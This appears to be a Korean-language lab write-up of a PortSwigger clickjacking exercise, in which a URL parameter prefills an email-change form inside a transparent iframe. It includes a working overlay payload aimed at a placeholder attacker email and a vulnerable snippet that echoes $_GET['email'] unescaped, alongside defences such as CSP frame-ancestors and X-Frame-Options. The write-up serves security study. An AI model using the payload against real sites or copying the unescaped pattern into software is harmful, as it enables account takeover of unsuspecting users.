# Lab: Clickjacking with form input data prefilled from a URL parameter

## 개요

- **난이도**: Apprentice
- **주제**: Clickjacking — URL 파라미터로 폼 입력값 사전 입력 / iframe 오버레이
- **링크**: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

## 목표

이메일 변경 폼이 URL 파라미터(`?email=`)로 입력값을 미리 채울 수 있는 취약점과 클릭재킹을 결합하여, 피해자가 "Update email" 버튼을 클릭하게 만들어 이메일을 변경한다.

## 001 랩과의 차이

```
[001 랩 — Delete account 버튼 클릭재킹]
  목표: 버튼 하나 클릭 → 계정 삭제
  별도 입력값 불필요 (버튼 클릭만으로 동작)

[002 랩 — 폼 제출 클릭재킹]
  목표: 이메일 변경 폼 제출
  문제: 폼에 이메일 입력값이 있어야 함
        → 피해자가 직접 입력하게 할 수 없음
  해결: URL 파라미터로 이메일 값을 미리 채워 iframe 로드
        ?email=attacker@evil.com → 폼 필드 자동 입력

공통점:
  iframe 투명 오버레이로 피해자 클릭 유도
```

## URL 파라미터로 폼 값 사전 입력 취약점

```
취약한 구현:
  /my-account?email=VALUE → 이메일 폼 필드에 VALUE 가 미리 입력됨

  서버 또는 클라이언트:
  <input type="email" name="email" value="<?= $_GET['email'] ?>">
  또는
  const email = new URLSearchParams(location.search).get('email');
  document.querySelector('#email').value = email;

공격자 활용:
  iframe src="https://VULNERABLE.com/my-account?email=attacker@evil.com"
  → iframe 내 이메일 필드에 attacker@evil.com 이 미리 채워짐
  → 피해자가 "Update email" 버튼만 클릭하면 제출
```

## 공격 방법

### 페이로드

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;         /* 위치 조정 중: 반투명 */
        /* opacity: 0.0001;   최종 공격: 거의 투명 */
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 450px;           /* Update email 버튼 위치에 맞게 조정 */
        left: 60px;
        z-index: 1;
    }
</style>

<div id="decoy">Click me!</div>
<iframe src="https://VULNERABLE.com/my-account?email=attacker@evil.com"></iframe>
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문

2. iframe 로드:
   https://VULNERABLE.com/my-account?email=attacker@evil.com
   → 이메일 필드에 attacker@evil.com 미리 채워짐
   → iframe 은 투명 (피해자에게 보이지 않음)

3. 피해자: "Click me!" (decoy) 클릭
   → 실제로는 iframe 안의 "Update email" 버튼 클릭

4. 브라우저:
   POST /my-account/change-email
   Cookie: session=VICTIM_SESSION
   Body: email=attacker@evil.com&csrf=REAL_TOKEN

5. 서버: 이메일 변경 처리 → 공격 성공
```

## 001 랩과의 비교

| 항목 | 001 랩 | 002 랩 (이번) |
|------|--------|--------------|
| 목표 | 계정 삭제 | 이메일 변경 |
| 클릭 대상 | Delete account 버튼 | Update email 버튼 |
| 입력값 | 불필요 | 공격자 이메일 사전 입력 필요 |
| iframe URL | `/my-account` | `/my-account?email=attacker@evil.com` |
| 추가 조건 | 없음 | URL 파라미터로 폼 값 사전 입력 가능해야 함 |

## 핵심 정리

- URL 파라미터로 폼 필드를 사전 입력할 수 있으면, 클릭재킹과 결합해 원하는 값으로 폼 제출이 가능하다.
- 클릭재킹의 핵심은 iframe 위치 조정으로 피해자가 클릭할 버튼을 decoy UI 뒤에 겹치는 것.
- **방어**:
  - `X-Frame-Options: DENY` 또는 `CSP: frame-ancestors 'none'` — iframe 로드 차단
  - URL 파라미터로 폼 필드 사전 입력 기능 제거 또는 화이트리스트 검증
  - 민감한 작업 전 재인증 요구 (현재 비밀번호 확인 등)

## 배운 점 및 추가 학습

### URL 파라미터 폼 사전 입력의 위험성

```
편의성 목적으로 구현되는 경우:
  이메일 초대 링크: /register?email=user@example.com
  편집 페이지:      /edit?title=기존제목&content=기존내용
  검색 폼:          /search?q=검색어

클릭재킹과 결합 시 위험:
  공격자가 원하는 값을 미리 채운 URL 을 iframe 에 로드
  → 피해자는 클릭만 하면 됨 (값 입력 불필요)
  → 의도하지 않은 값으로 폼 제출
```

### 클릭재킹 공격 가능 조건 체크리스트

```
필수 조건:
  □ 타겟 사이트가 iframe 으로 로드 가능 (X-Frame-Options 없음)
  □ 클릭 한 번으로 동작하는 기능 존재 (버튼, 링크)

추가 조건 (폼 제출 클릭재킹):
  □ URL 파라미터 또는 다른 방법으로 입력값 사전 설정 가능
  □ 또는 클릭 전에 피해자가 직접 입력하게 유도 가능

공격 효과를 높이는 조건:
  □ 재인증 없이 민감한 작업 가능 (비밀번호 재입력 없음)
  □ 확인 다이얼로그 없음 ("정말 삭제하시겠습니까?" 없음)
```

### 클릭재킹 방어 우선순위

```
1순위 (근본 해결):
  Content-Security-Policy: frame-ancestors 'none'
  → 어떤 도메인에서도 iframe 로드 불가
  → 클릭재킹 자체가 불가능

2순위 (구형 브라우저 대응):
  X-Frame-Options: DENY
  → CSP 미지원 구형 브라우저 대응용
  → CSP frame-ancestors 와 병행 설정 권장

3순위 (보조):
  JavaScript frame-busting:
  if (top !== self) { top.location = self.location; }
  → 우회 가능 (sandbox iframe 등으로 무력화)
  → 단독 사용 비권장

4순위 (UX 레이어):
  중요 작업에 재인증 요구
  확인 다이얼로그 추가
  → 클릭재킹 완전 차단은 아니지만 피해 축소
```
